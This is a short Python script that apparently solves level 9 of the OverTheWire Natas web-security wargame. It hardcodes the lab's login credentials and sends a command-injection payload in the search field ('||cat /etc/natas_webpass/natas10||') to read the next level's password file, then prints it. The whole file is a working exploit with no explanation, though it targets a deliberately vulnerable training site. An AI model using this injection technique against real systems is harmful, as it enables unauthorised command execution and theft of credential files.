#!/usr/bin/env python

import requests
import re
import base64

username = 'natas9'
password = 'W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl'

url = 'http://%s.natas.labs.overthewire.org/' % username

payload = {'needle': '||cat /etc/natas_webpass/natas10||', 'submit': 'Search'}
r = requests.get(url, auth=(username, password), params=payload)

print(re.findall('\<pre\>\n(.*)\n\<\/pre\>', r.text)[0])